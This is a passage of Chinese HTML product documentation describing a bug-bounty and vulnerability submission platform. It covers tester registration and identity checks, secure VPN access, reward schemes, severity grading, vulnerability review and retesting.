title="对漏洞条目自定义编辑："></a>对漏洞条目自定义编辑：</h4><p>允许用户对漏洞条目进行自定义编辑，可以对包括：漏洞名称、等级、类型、漏洞描述、漏洞修复建议、CVSS向量和风险值、参考信息进行修改和完善。</p><p>这项功能使用户能够根据特定需求或内部环境，对漏洞条目进行修改和完善。用户可以编辑漏洞的重要属性，例如漏洞名称、等级（严重程度）、类型、详细描述、修复建议、CVSS向量和风险值等，以及提供相关参考信息。这样的操作能够帮助用户更准确地描述漏洞情况、评估风险，并提供更精确的修复建议。</p><p>用户自定义编辑漏洞条目的功能，有助于适应不同环境和需求，提高漏洞管理的灵活性和适用性，使用户能够更好地应对特定安全挑战和需求。</p><h2 id="漏洞提交平台（SRC）"><a href="#漏洞提交平台（SRC）" class="headerlink" title="漏洞提交平台（SRC）"></a>漏洞提交平台（SRC）</h2><p>漏洞提交平台（SRC）为安全测试和漏洞提交提供了多重功能和保障措施，主要是提供一个公开、透明的渠道让安全研究人员能够提交他们发现的漏洞并获取奖励。同时，提供大量漏洞信息分享，帮助人员深入学习。主要包含以下功能特点：</p><p>多种安全认证方式：平台支持多种安全认证方式，包括实名认证、平台线上协议、行为规范等，以确保安全测试和漏洞提交的合法性和安全性。</p><p>快速漏洞审核：平台的漏洞运营人员会在白帽子提交漏洞后第一时间进行审核和响应，确保漏洞得到及时处理和评估。</p><p>奖励计划发布：平台提供内部接口，供运营部门发布各种不同的漏洞奖励计划。这些计划包括名人堂、白帽赏金、众测比赛等，以鼓励白帽子积极参与漏洞发现和报告。</p><p>需求评估与授权：用户可以根据其安全需求，通过平台向白帽子发送需求评估文档与授权评估函。这有助于明确每个项目的要求、时间、测试范围和测试行为等规定，以确保测试的有效性和符合用户的需求。</p><p>功能参数如下：</p><ul><li>平台支持通过实名认证、平台线上协议、行为规范等多种方式保障安全测试、安全提交漏洞</li><li>平台漏洞运营人员第一时间响应审核白帽子所提交漏洞</li><li>平台提供内部接口给运营部门发布各种不同的漏洞奖励计划。常见的奖励项目有：名人堂、白帽赏金、众测比赛等。</li><li>用户可根据自身安全需求，通过平台给白帽子发送需求评估文档与授权评估函。</li></ul><h3 id="多种安全认证方式："><a href="#多种安全认证方式：" class="headerlink" title="多种安全认证方式："></a>多种安全认证方式：</h3><p>平台支持多种安全认证方式，包括实名认证、平台线上协议和行为规范等，以确保白帽子黑客和安全研究人员的身份和合法性。</p><p>实名认证： 用户可以通过实名认证机制验证其身份信息，这种方式有助于确保用户的真实身份，并降低虚假信息的风险。</p><p>平台线上协议： 平台提供线上协议，要求用户在参与安全测试或提交漏洞之前必须同意一系列的条款和条件。这些协议通常会详细说明用户在平台上所承担的责任和义务。</p><p>行为规范： 平台制定了特定的行为规范，规定了用户在进行安全测试和漏洞提交时的行为标准和规则。这些规范旨在确保用户行为符合道德规范和法律要求，并维护平台的安全和合规性。</p><h3 id="快速漏洞审核："><a href="#快速漏洞审核：" class="headerlink" title="快速漏洞审核："></a>快速漏洞审核：</h3><p>平台的漏洞运营人员将会在第一时间响应并审核白帽子提交的漏洞，以确保及时发现和解决潜在的安全问题。</p><p>平台漏洞运营人员会快速响应并审核由白帽子提交的漏洞。他们负责接收漏洞报告，评估、验证漏洞的严重性，分配优先级并通知相关团队或责任人。安全团队还需要跟踪漏洞的整个生命周期，并向漏洞提交者提供及时的反馈。整个过程旨在有效处理漏洞、降低安全风险。</p><h3 id="漏洞奖励计划："><a href="#漏洞奖励计划：" class="headerlink" title="漏洞奖励计划："></a>漏洞奖励计划：</h3><p>平台提供内部接口，供运营部门发布各种不同的漏洞奖励计划。这些计划可以包括名人堂、白帽赏金、众测比赛等，以奖励那些发现并报告漏洞的白帽子黑客。</p><p>平台会发布多种不同类型的漏洞奖励计划。这些奖励项目包括名人堂、白帽赏金、以及众测比赛等。</p><p>名人堂是为那些在安全领域取得显著成就或者贡献的专业人士设立的一种荣誉认可平台。</p><p>白帽赏金计划则是指为那些发现并报告系统、软件或网站中存在漏洞的人提供奖励的制度。这些奖励可以是实物、金钱或其他形式的激励。 众测比赛则是一种通过集体智慧来检测系统漏洞的活动，通常由一个团队或者一群安全研究人员共同参与。这些不同类型的漏洞奖励计划为安全领域的专业人士提供了多样化的机会，激励他们积极参与并贡献于网络安全的发展。这些奖励计划的设立不仅鼓励了安全领域的人才持续投入和研究，也促进了整个网络环境的安全性与稳定性。</p><h3 id="需求评估与授权："><a href="#需求评估与授权：" class="headerlink" title="需求评估与授权："></a>需求评估与授权：</h3><p>用户可以根据其安全需求，通过平台向白帽子发送需求评估文档和授权评估函。帮助用户明确他们所关注的特定安全领域，并请求白帽子进行相应的安全评估。</p><p>用户可以利用平台来制作并发送详细的安全评估需求文档，其中包括他们期望白帽子（安全专家或研究人员）对系统、软件或网站进行评估的具体要求和范围。这份文档通常会包含所需的测试类型、漏洞范围、测试方法、安全标准以及其他相关细节。同时，用户也可以发送授权评估函，以正式授权白帽子对其系统或软件进行安全评估和测试。这份函件将明确规定评估的范围、权限和时间安排，并确保白帽子在进行评估时符合法律和道德规范，同时保护用户和组织的利益。通过这种方式，用户可以利用平台与白帽子合作，确保其系统和数据的安全性得到专业的评估和保障。</p><h3 id="测试人员管理"><a href="#测试人员管理" class="headerlink" title="测试人员管理"></a>测试人员管理</h3><p>漏洞提交平台的测试人员管理模块提供了全面的功能，以确保测试人员能够有效地参与漏洞发现和报告过程，并保障通道安全：</p><p>自定义平台界面：SRC平台支持LOGO和内容排版的自定义，确保界面美观大方，符合用户要求。</p><p>测试人员注册和信息管理：平台提供测试人员注册功能，并允许他们维护个人信息。测试人员可以查看自己发布的漏洞以及漏洞的状态、已获得的奖励以及参与的项目。</p><p>资源申请与漏洞上报：测试人员可以发起资源申请，上报漏洞，并提供详细的漏洞信息、危害截图以及必要的附件，以便进行漏洞验证或证明测试的合规性。</p><p>外部测试人员支持：平台支持外部测试人员的注册、密码修改、支付账户关联和提现等操作，确保外部测试人员的参与。</p><p>身份验证和金融信息：白帽子填写身份信息和金融信息，提供身份证复印件，并签署线上线下纸质保密协议。平台通过相关接口验证白帽子的身份信息和金融信息的真实有效性。</p><p>漏洞申报和跟踪：测试人员可以申报漏洞测试，申请测试资源，并跟踪他们上报的漏洞信息。</p><p>漏洞信息展示：平台支持测试人员查看其提交的所有漏洞的不同视图展示，包括分属的不同项目和漏洞等级。</p><p>通道安全：平台采用身份令牌系统、VPN、微信接口和威胁检测手段相结合来保障通道安全。白帽子通过多因子认证登录SSLVPN网关进行众测项目活动。</p><p>测试管理要求：平台明确测试管理要求，包括测试时间、测试范围、禁止行为等，以确保测试不影响正常线上业务并不泄露项目信息。</p><p>功能参数如下：</p><ul><li>SRC平台界面支持LOGO和内容排版的自定义，界面效果美观大方，符合客户要求。</li><li>平台提供测试人员注册、信息的新增、维护功能。测试人员可以查看自己发布的漏洞及其状态、获取的奖励、参与的项目。</li><li>测试人员可以发起申请资源，上报漏洞以及漏洞发现过程及危害截图，并上传必要的附件，以便于验证漏洞或证明测试的合规性。</li><li>支持外部测试人员注册、修改密码、支付账户关联、取现等操作；</li><li>白帽填写身份信息和金融信息，提供身份证复印件，支持签署线上线下纸质保密协议，平台通过相关接口验证白帽子身份信息和金融信息是否真实有效。</li><li>支持测试人员申报漏洞测试，申请测试资源，上报发现的漏洞；</li><li>支持测试人员跟踪其上报的漏洞信息。</li><li>支持测试人员查看其提交的所有漏洞的不同视图展示，如分属的不同项目、漏洞等级。</li><li>平台支持采用身份令牌系统（VPN动态口令）、VPN（SSLVPN网关）、微信接口（SRC平台动态口令）与威胁检测手段（全日志流量分析系统、APT监测系统）相结合来保障通道安全。</li><li>白帽子通过多因子认证登录SSLVPN网关，开展众测项目活动（渗透服务过程）。</li><li>平台应支持给参与众测项目的白帽子开通身份令牌系统账号，白帽子通过登录身份令牌系统获得一次一密登录码。</li><li>平台应明确测试管理要求及办法并通过有效手段进行监督白帽子测试行为，包含明确测试时间、明确测试范围、明确禁止行为，以不影响正常线上业务、不泄露任何项目信息为准则开展测试。</li></ul><h4 id="用户界面自定义："><a href="#用户界面自定义：" class="headerlink" title="用户界面自定义："></a>用户界面自定义：</h4><p>SRC平台支持LOGO和内容排版的自定义，确保界面美观大方，同时满足用户的审美要求。</p><p>SRC平台提供了界面自定义功能，支持用户对LOGO和内容排版进行个性化设置。用户可以根据需要在平台上上传自己的LOGO，使界面更符合其品牌形象或企业标识。此外，该平台还提供了内容排版的自定义选项，使用户能够调整页面布局、颜色搭配和文字样式等，以满足不同客户的要求和审美标准。这种自定义功能使得SRC平台的界面效果更为美观、大方，并且能够符合客户对界面美感和整体风格的要求。</p><h4 id="测试人员信息管理："><a href="#测试人员信息管理：" class="headerlink" title="测试人员信息管理："></a>测试人员信息管理：</h4><p>测试人员可以在平台上完成注册、信息的新增和维护，同时查看自己发布的漏洞及其状态、获取的奖励、参与的项目等。</p><p>该平台具备测试人员注册、信息新增和维护功能。注册功能允许测试人员在平台上注册账户，提供个人信息并创建账户以便参与漏洞测试和安全项目。信息新增和维护功能允许注册的测试人员随时更新和管理其个人信息，包括联系方式、技能专长等内容。</p><p>测试人员登录后，可以查看自己发布的漏洞报告及其状态。这意味着他们可以跟踪自己提交的漏洞报告，查看其处理状态、修复进度或者相关的反馈信息。此外，他们还能够获取他们参与的项目相关信息，包括项目详情、参与方式、任务进度等等。</p><p>测试人员也可以在平台上查看他们获得的奖励情况。这包括他们因发现并报告漏洞而获得的各种奖励。这种功能的存在可以帮助测试人员对自己的工作成果有清晰的了解，并激励他们积极参与更多的安全测试项目。</p><p>平台提供了一个便捷的管理系统，让测试人员可以方便地跟踪自己的漏洞报告、参与的项目以及获得的奖励，从而更好地管理和追踪他们在平台上的安全测试活动。</p><h4 id="白帽人员信息验证："><a href="#白帽人员信息验证：" class="headerlink" title="白帽人员信息验证："></a>白帽人员信息验证：</h4><p>我方会要求白帽人员进行身份、金融信息的填写，需要他们提供身份复印件，支持签署线下线上保密协议，平台会通过相关接口验证白帽子身份信息和金融信息是否真实有效。</p><p>平台会要求白帽填写身份信息和金融信息，并提供身份证复印件，同时支持签署线上或线下的保密协议。这些信息提交后，平台将通过相关接口验证白帽子所提供的身份信息和金融信息的真实性和有效性。这种做法旨在确保平台与参与者的安全和可信度。平台会利用接口验证所提供信息的真实性，从而确保白帽子身份信息和金融信息的合法性，并保障平台和参与者的权益。这种验证机制有助于防范潜在的欺诈行为，保护平台和用户的利益，建立一个安全可靠的合作环境。</p><h4 id="测试人员的资源申请与漏洞上报："><a href="#测试人员的资源申请与漏洞上报：" class="headerlink" title="测试人员的资源申请与漏洞上报："></a>测试人员的资源申请与漏洞上报：</h4><p>安全人员可以方便地发起资源申请、上报漏洞，提供详细的漏洞信息、漏洞发现过程描述以及危害截图，并上传必要的附件，以便进行漏洞验证和测试合规性的证明。</p><p>测试人员在平台上可以提出资源申请，他们可以请求所需的工具、信息或支持来执行安全测试。他们也能够上报漏洞，详细说明漏洞是如何被发现的，它对系统安全的危害，并提供相关截图和必要的附件，以便审核人员验证漏洞的存在或者证明测试的合法性和准确性。这些举措都是为了保障安全测试的严谨性和可信度，确保漏洞的真实性以及测试的合规性。</p><h4 id="漏洞信息跟踪："><a href="#漏洞信息跟踪：" class="headerlink" title="漏洞信息跟踪："></a>漏洞信息跟踪：</h4><p>我方支持测试人员对自己上报的漏洞信息进行跟踪。</p><p>系统支持测试人员跟踪其上报的漏洞信息，测试人员可以在系统中实时查看他们上报的漏洞的状态和处理进度。通过系统提供的功能，测试人员可以了解漏洞的处理情况，包括漏洞是否已被确认、正在处理中还是已经解决。此外，他们还可以查看相关团队对漏洞采取的措施以及修复漏洞的进展情况。</p><p>这种功能让测试人员能够及时了解漏洞处理的状态，能够追踪漏洞的处理过程，随时了解漏洞修复的进度和结果。通过跟踪漏洞信息，测试人员可以更好地参与到整个漏洞管理流程中，有助于及时沟通和协作，确保漏洞得到有效解决，并为系统安全提供持续的支持和改进。</p><h4 id="资源申请与漏洞上报："><a href="#资源申请与漏洞上报：" class="headerlink" title="资源申请与漏洞上报："></a>资源申请与漏洞上报：</h4><p>安全人员可以方便地发起资源申请、上报漏洞，提供详细的漏洞信息、漏洞发现过程描述以及危害截图，并上传必要的附件，以便进行漏洞验证和测试合规性的证明。</p><p>测试人员在平台上可以提出资源申请，他们可以请求所需的工具、信息或支持来执行安全测试。他们也能够上报漏洞，详细说明漏洞是如何被发现的，它对系统安全的危害，并提供相关截图和必要的附件，以便审核人员验证漏洞的存在或者证明测试的合法性和准确性。这些举措都是为了保障安全测试的严谨性和可信度，确保漏洞的真实性以及测试的合规性。</p><h4 id="外部测试人员支持："><a href="#外部测试人员支持：" class="headerlink" title="外部测试人员支持："></a>外部测试人员支持：</h4><p>SRC平台支持外部测试人员的注册，同时提供修改密码、支付账户关联和提现等操作。</p><p>平台支持外部测试人员进行注册、密码修改、关联支付账户以及取现等操作。外部测试人员可以通过平台注册账户，填写相关信息并创建个人账户以参与安全测试。同时，他们可以随时修改账户密码，以确保账户安全。</p><p>平台也提供了关联支付账户的功能，使测试人员能够将其账户与支付方式关联，便于收取获得的奖励或报酬。这种关联支付账户的功能有助于测试人员方便快捷地接收相应的经济回报。</p><p>平台还支持外部测试人员进行取现操作，让他们能够将奖励或报酬转移到其关联的支付账户上，以便实现金融支出或者提现的需求。</p><p>这些操作的支持使得外部测试人员能够便捷地管理其账户信息、安全地接收奖励，并在需要时进行取现操作，从而更好地参与到安全测试项目中。</p><h4 id="测试人员提交漏洞多视图展示："><a href="#测试人员提交漏洞多视图展示：" class="headerlink" title="测试人员提交漏洞多视图展示："></a>测试人员提交漏洞多视图展示：</h4><p>平台可以为测试人员查看其提交的所有漏洞的不同视图展示，如分属的不同项目、漏洞等级。</p><p>平台支持测试人员申报漏洞测试、申请测试资源以及上报发现的漏洞。测试人员可以通过平台发起申请，请求所需的测试资源，如工具、权限或其他支持，以便进行安全漏洞测试。同时，他们也能够上报他们所发现的漏洞，详细描述漏洞的性质、影响和可能的解决方案。</p><h4 id="身份验证与通道安全："><a href="#身份验证与通道安全：" class="headerlink" title="身份验证与通道安全："></a>身份验证与通道安全：</h4><p>平台采用多因子认证机制，包括VPN动态口令、SSLVPN网关、微信接口以及威胁检测手段，以确保通信通道的安全性。</p><p>白帽通过多因子认证登录SSLVPN网关，开展众测项目活动（渗透服务过程）。</p><p>平台支持给参与众测项目的白帽子开通身份令牌系统账号，白帽子通过登录身份令牌系统获得一次一密登录码。</p><p>平台为白帽子提供填写身份信息和金融信息的功能，并要求提供身份证复印件。同时，平台支持签署线上或线下纸质保密协议，以确保敏感信息的保密性和安全性。平台通过相关接口对白帽子提交的身份信息和金融信息进行验证，以确认其真实性和有效性。</p><p>这种流程旨在确保白帽子身份和金融信息的真实合法性。通过验证身份证复印件、签署保密协议以及接口验证，平台可以对白帽子提交的信息进行审核和验证，以保障安全测试过程中的信息安全和合规性。这些措施有助于建立信任，确保平台上参与测试的白帽子身份和金融信息的真实性和有效性。</p><h4 id="明确测试管理要求："><a href="#明确测试管理要求：" class="headerlink" title="明确测试管理要求："></a>明确测试管理要求：</h4><p>平台明确了测试管理的要求和规定，包括测试时间、测试范围和禁止行为，以确保测试活动不会对线上业务造成干扰，同时保障项目信息的机密性。</p><p>平台明确定义了测试管理要求和方法，并通过有效手段监督白帽子的测试行为。这些方法包括明确测试时间、界定测试范围、规定禁止行为等。</p><p>明确的测试时间表明测试在何时进行，帮助白帽子了解何时可以开展活动以及何时需要停止。其次，明确定义测试范围能够确保白帽子知道可以探索的区域和测试的限制。同时，规定禁止行为可以保障线上业务不受干扰，防止项目信息泄露。此外，测试行为应以保护正常线上业务和保密项目信息为准则。</p><p>通过这些规定和准则，平台能够建立起一套清晰的测试管理制度，促进白帽子们在规定的框架内开展测试活动。同时，监督测试行为有助于确保测试过程安全可靠，保障线上业务的正常运行并防止项目信息泄露。</p><h3 id="项目运营管理"><a href="#项目运营管理" class="headerlink" title="项目运营管理"></a>项目运营管理</h3><p>漏洞级别和奖金机制定义：平台运营部门可以根据需要自定义漏洞级别和奖金机制。不同的奖赏组合可以吸引不同类型的白帽子来承接任务工作。</p><p>漏洞定级：系统默认为漏洞定级，并允许对高危、中危、低危等级的漏洞进行详尽的定义，以确保漏洞得到适当的关注和处理。</p><p>专属SRC门户：平台提供了专属的SRC门户，使运营部门能够高效管理漏洞和项目。</p><p>API接口支持：提供API接口，以便与其他系统或平台进行漏洞数据对接，确保信息的畅通和共享。</p><p>漏洞审核人员：我方提供专职漏洞审核人员，这些人员必须具备多年的漏洞挖掘经验，以确保漏洞的提交有效性和质量。这些审核人员将协助平台运营部门进行漏洞审核和管理。</p><p>功能参数如下：</p><ul><li>平台运营部门可定义漏洞级别及奖金机制，通过不同的奖赏组合吸引不同白帽子承接任务工作。</li><li>支持默认漏洞定级，对高危等级漏洞、中危等级漏洞、低危等级漏洞进行详尽的定义。</li><li>支持提供专属SRC门户。</li><li>支持提供API接口，进行漏洞数据对接。</li><li>提供专职漏洞审核人员，人员必须具备多年漏洞挖掘经验，保障漏洞提交的有效性。</li></ul><h4 id="奖赏机制定义："><a href="#奖赏机制定义：" class="headerlink" title="奖赏机制定义："></a>奖赏机制定义：</h4><p>平台允许运营部门根据特定项目的需求，自定义漏洞级别及相应的奖金机制。这意味着可以根据项目的安全风险和紧急程度，制定各种奖励组合，以吸引不同技能和经验水平的白帽子承接任务工作。</p><p>平台运营部门可以根据需要定义漏洞级别和奖金机制，以激励不同白帽子参与任务工作。通过制定不同的奖赏组合，可以针对不同漏洞级别设定相应的奖金水平，从而吸引和鼓励白帽子积极参与。</p><p>漏洞级别可以根据其严重程度和影响分为不同等级，比如高、中、低等级漏洞。平台可以针对每个级别制定相应的奖金机制，以便更有针对性地吸引白帽子对不同级别的漏洞进行测试和报告。</p><p>这种奖金机制可以采用多种形式，例如针对不同级别的漏洞设定不同额度的现金奖励、积分制度、特定福利或者排行榜奖励等。通过提供不同的奖赏组合，平台可以吸引到更多不同技能水平和兴趣领域的白帽子参与，促进漏洞的发现和修复工作。这种差异化的奖金机制能够更好地激发白帽子的积极性，推动安全领域的持续发展。</p><h4 id="漏洞定级："><a href="#漏洞定级：" class="headerlink" title="漏洞定级："></a>漏洞定级：</h4><p>平台支持默认漏洞定级，同时也提供了高危、中危和低危等级漏洞的详尽定义。这有助于更准确地评估漏洞的风险，使运营部门能够更好地分配资源和设置奖励。</p><p>高危等级漏洞：这类漏洞可能对系统或数据安全造成严重影响，有潜在的风险导致重大损失，需要紧急修复。这些漏洞可能包括远程执行代码、权限提升、敏感信息泄露等，对系统安全性构成直接威胁。</p><p>中危等级漏洞：这类漏洞具有一定的风险，可能会导致某些功能受损或者信息泄露，但对整个系统的安全性影响较低。中危漏洞可能包括部分权限问题、部分信息泄露、中等风险的拒绝服务攻击等。</p><p>低危等级漏洞：这些漏洞通常影响较小，对系统整体安全性的威胁较小。它们可能包括界面缺陷、信息泄露的风险较低的内容等。虽然需要修复，但影响范围较小，不会对系统核心安全带来严重威胁。</p><h4 id="专属SRC门户："><a href="#专属SRC门户：" class="headerlink" title="专属SRC门户："></a>专属SRC门户：</h4><p>为了提高项目管理的效率，SRC平台提供了专属的SRC门户。这个门户为运营部门提供了一个集中管理和协作的平台，使其能够更轻松地跟踪漏洞任务的状态、分配工作和与测试人员沟通。</p><p>平台提供专属的SRC门户，为安全研究人员和白帽子提供个性化的入口。该门户允许他们管理漏洞报告、查看任务分配情况、追踪漏洞状态，并提供专属资源和工具支持测试活动。同时，门户展示个人奖励和排名，激励参与者贡献。这一门户不仅提供方便的管理平台，也增强透明度和奖励公平性。</p><h4 id="API接口支持："><a href="#API接口支持：" class="headerlink" title="API接口支持："></a>API接口支持：</h4><p>SRC平台开放了API接口，允许与其他漏洞数据源进行对接。</p><p>平台支持提供API接口，允许漏洞数据进行对接。</p><p>可以通过API与平台进行通信和数据交换，以便自动化或集成外部系统与平台之间的漏洞数据传输和共享。这样的API接口使得不同系统能够直接连接并共享漏洞数据，提高了信息的互通性和整合性。</p><p>通过API接口，可以实现更高效的数据流动和协作，有助于加强安全生态系统，促进漏洞信息的快速传递和处理。</p><h4 id="漏洞审核人员："><a href="#漏洞审核人员：" class="headerlink" title="漏洞审核人员："></a>漏洞审核人员：</h4><p>为了确保漏洞提交的有效性和质量，我方会提供专职漏洞审核人员。这些审核人员必须具备多年的漏洞挖掘经验，以审查和确认漏洞的真实性和潜在威胁。他们的存在将提高漏洞审核的可信度和可靠性。</p><p>我方提供专职漏洞审核人员，其具备多年漏洞挖掘经验，以确保漏洞提交的有效性和可靠性。这些专职审核人员经验丰富，熟悉漏洞挖掘技术和行业标准，能够深入理解系统和应用程序的安全漏洞，准确判断漏洞的严重性和影响。他们的存在可以提高漏洞审核的质量和准确性，确保仅有效和合规的漏洞得到提交和处理。这种安排有助于保障安全测试的专业性和可信度，为安全生态系统提供更可靠的漏洞报告和安全性保障。</p><h3 id="项目运维管理"><a href="#项目运维管理" class="headerlink" title="项目运维管理"></a>项目运维管理</h3><p>平台项目运维方面提供了多项功能，以便于内部人员管理、运营和监督测试项目的顺利进行：</p><p>项目发布与管理：内部人员可以轻松发布不同类型的测试项目，并定义漏洞奖励标准以吸引白帽子的参与。平台提供了灵活的发布漏洞奖励方案，包括名人堂展示规则。</p><p>需求评估文档与授权评估函：用户需要根据其安全需求向平台发送需求评估文档和授权评估函，明确项目的要求、时间、测试范围和测试行为等规定。这些规定将在平台上展示，以供白帽子了解。</p><p>白帽子报名与筛选：项目以定向邀请或自主报名的方式进行白帽子的报名和筛选，确保参与项目的测试人员具备所需的技能和经验。</p><p>漏洞审核与复测：平台支持对白帽子提交的漏洞进行审核，专业的项目技术专家提供审核服务，验证、评级和审核漏洞。在用户修复漏洞后，我方团队协同进行漏洞复测，确保漏洞已完全修复且未引入新问题。</p><p>项目安全测试总结报告：白帽子在测试完成后提供详细的项目安全测试总结报告，分析用户现有问题并提供未来安全建设的有效建议。</p><p>众测服务时间限制：每次众测服务的时间最长不超过1个月，要求参与的精英可信白帽子数量等于5人。</p><p>自定义漏洞奖励标准与价格：平台支持用户自定义漏洞奖励标准和漏洞奖励价格，可以自主控制测试范围。漏洞奖金100%效果付费，无漏洞不收费，还可以采用漏洞奖金预充值的方式。</p><p>丰富的漏洞报送经历：平台具备丰富的漏洞报送经验，可提供漏洞信息报送的突出贡献单位。</p><p>功能参数如下：</p><ul><li>支持内部人员发布不同的测试项目；</li><li>提供发布漏洞奖励标准；</li><li>我司已提供名人堂展示规则方案；</li><li>用户可根据自身安全需求，发送需求评估文档与授权评估函，说明本次项目要求、时间、测试范围、测试行为等规定，将规定发布到平台端进行展示；</li><li>支持以定向邀请的形式或自主报名的方式，进行白帽子报名及筛选；</li><li>支持对白帽子通过平台提交的漏洞审核，项目技术专家提供专业的漏洞审核服务，7*24小时对发现的漏洞进行验证、审核、评级等工作；</li><li>用户在漏洞修复后，团队协同进行漏洞复测，确保每一个漏洞都被完全修复，且未产生新的漏洞问题；</li><li>测试完成后，白帽子提供报告服务，提供详细的项目安全测试总结报告，对用户现有问题进行分析，并对未来的安全建设提供有效建议；</li><li>每次众测服务时间最长不超过1个月，参与的精英可信白帽数量不少于5人；</li><li>自定义漏洞奖励标准与漏洞奖励价格（最低标准：高危1000中危300低危30）；</li><li>100%效果付费，无漏洞不收费，消费透明；企业可自定义漏洞奖励标准与漏洞奖励价格，自主控制测试范围。采取漏洞奖金预充值的方式；</li><li>我司拥有丰富的漏洞报送经历，具有漏洞信息报送突出贡献单位，证明材料如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/46544f187ee6b060bd352f5679885a03.png" alt="555c9907d8d665e9d210c17a27cb942"></p><h4 id="项目发布与管理："><a href="#项目发布与管理：" class="headerlink" title="项目发布与管理："></a>项目发布与管理：</h4><p>SRC平台提供了内部人员发布不同测试项目的功能。项目发布过程包括定义漏洞奖励标准并发布，这有助于吸引并激励白帽子参与测试工作。</p><p>平台支持内部人员发布多样化的测试项目。内部人员有权限创建并发布各种不同类型的测试任务，以吸引安全研究人员和白帽子参与。这些测试项目可以针对不同系统、应用程序、网络或软件进行，覆盖不同的安全测试需求，例如安全审计、漏洞挖掘、安全扫描等。</p><p>内部人员在发布测试项目时可以提供详细的说明、测试范围、期望的测试方向以及相应的奖励机制。这些项目的发布将为安全研究人员和白帽子提供一个参与和贡献的平台，并鼓励他们积极发现和报告潜在的安全漏洞。</p><p>这种支持内部人员发布多样化测试项目的方式可以使平台更加灵活和多元化，满足不同安全领域的测试需求，同时也激励更多的安全专家积极参与到安全测试工作中。</p><h4 id="名人堂展示规则方案："><a href="#名人堂展示规则方案：" class="headerlink" title="名人堂展示规则方案："></a>名人堂展示规则方案：</h4><p>平台支持名人堂展示规则方案。这有助于建立社区声誉和专业形象，进一步激励他们积极参与项目。</p><p>名人堂展示规则方案是为展示在安全领域取得杰出成就或做出重大贡献的专家所设计的规范。其中包括评选标准、评选流程、不同评选类别、展示内容、奖励形式以及信息更新等方面的规定，旨在公正、透明地表彰安全领域的杰出人才，激励更多人积极投身于安全研究与贡献。</p><h4 id="项目需求评估："><a href="#项目需求评估：" class="headerlink" title="项目需求评估："></a>项目需求评估：</h4><p>用户需要根据自身的安全需求，通过发送需求评估文档和授权评估函，明确项目要求、时间、测试范围、测试行为等规定。这些规定将发布到平台端供白帽子参考，以确保项目的目标清晰明确。</p><p>用户根据其安全需求，向平台发送需求评估文档与授权评估函。这些文件详细说明本次项目的要求、测试时间安排、涵盖的测试范围、所期望的测试行为等规定。平台会将这些规定发布展示，确保所有参与安全测试的人员清楚了解项目的具体要求和限制。这一举措旨在保障测试活动的合规性和准确性，为安全测试提供明确的指导和规范，以确保测试的有效性和可信度。</p><h4 id="白帽子招募与筛选："><a href="#白帽子招募与筛选：" class="headerlink" title="白帽子招募与筛选："></a>白帽子招募与筛选：</h4><p>平台支持以定向邀请或自主报名的方式，招募白帽子参与项目，以此方式进行白帽子的报名和筛选。</p><p>定向邀请: 平台可以通过特定条件或以往表现优异的白帽子，发出定向邀请参与安全测试项目。这种方式可以针对特定的专业领域或技术能力，有针对性地邀请合适的白帽子参与测试。</p><p>自主报名: 平台也允许白帽子自主报名参与安全测试项目。他们可以浏览平台上发布的项目，根据自身技能和兴趣选择合适的项目进行报名。然后，平台根据一定的筛选标准，对报名者进行评估和筛选，以确定最合适的参与者。</p><h4 id="漏洞审核与验证："><a href="#漏洞审核与验证：" class="headerlink" title="漏洞审核与验证："></a>漏洞审核与验证：</h4><p>平台支持对白帽子提交的漏洞进行审核和验证。项目技术专家将提供专业的漏洞审核服务，7x24小时不间断工作，以验证、审核和评级漏洞。这有助于确保漏洞的有效性和准确性。</p><p>这个审核流程包括对漏洞的验证和评估，以确认漏洞的真实性和严重性。专业团队将对漏洞进行仔细审查，确定其是否存在以及可能的影响程度。他们会对漏洞进行评级，区分其优先级和影响程度，以便制定相应的修复计划。</p><p>这种由专业团队进行的漏洞审核工作，有助于确保漏洞报告的准确性和可靠性。同时，24小时全天候的服务能够及时响应并处理提交的漏洞报告，提高漏洞修复的效率和及时性，从而增强系统的安全性。</p><h4 id="漏洞修复与复测："><a href="#漏洞修复与复测：" class="headerlink" title="漏洞修复与复测："></a>漏洞修复与复测：</h4><p>用户在漏洞修复后，我方团队将与白帽子协同工作，进行漏洞的复测。这确保了每个漏洞都被完全修复，而且不会产生新的漏洞问题，提高了系统的整体安全性。</p><p>这个复测过程包括：</p><p>漏洞验证：重新验证原先被报告的漏洞，确认是否被有效修复。团队会执行相同的测试步骤，以检查漏洞是否已彻底解决。</p><p>回归测试：进行回归测试，确认修复过程中未引入新的漏洞或其他安全问题。此阶段旨在保证修复措施对系统的整体影响。</p><p>全面审查：对修复后的系统进行全面审查，确保系统安全性和稳定性不受影响，并避免新的安全风险或漏洞的产生。</p><h4 id="项目总结与建议："><a href="#项目总结与建议：" class="headerlink" title="项目总结与建议："></a>项目总结与建议：</h4><p>测试完成后，白帽子将提供详细的项目安全测试总结报告。这份报告不仅分析了用户现有的安全问题，还提供了未来安全建设的有效建议，有助于用户改进其安全体系。</p><p>该报告包括以下内容：</p><p>问题分析与详细说明：对测试过程中发现的问题进行详尽分析和描述，包括漏洞描述、危害程度和可能性等详细信息。</p><p>修复建议：针对发现的问题提供具体的修复建议，说明如何解决每个问题，并提供技术性的建议和步骤。</p><p>安全建设意见：为未来的安全建设提供有效的意见和建议，可能包括提高安全性的最佳实践、改善安全策略、加强防御措施等方面的建议。</p><p>总结与展望：对整体安全测试进行总结，强调改进和建设的必要性，并展望未来的安全工作方向。</p><h4 id="众测时长与人数限制："><a href="#众测时长与人数限制：" class="headerlink" title="众测时长与人数限制："></a>众测时长与人数限制：</h4><p>我方规定每次众测服务时间最长不超过1个月，参与的精英可信白帽数量不少于5人。</p><p>我方在进行众测服务时，项目的测试周期限定在一个月以内，并确保参与测试的白帽子精英团队至少有5名可信成员。这样的设置有助于控制测试时间，提高测试效率，并确保在相对较短的时间内收集到足够的专业反馈和测试数据。同时，拥有来自多个可信白帽子的参与有助于提高测试的多样性和可靠性，从而提高整体测试质量和覆盖范围。</p><h4 id="灵活的奖励机制："><a href="#灵活的奖励机制：" class="headerlink" 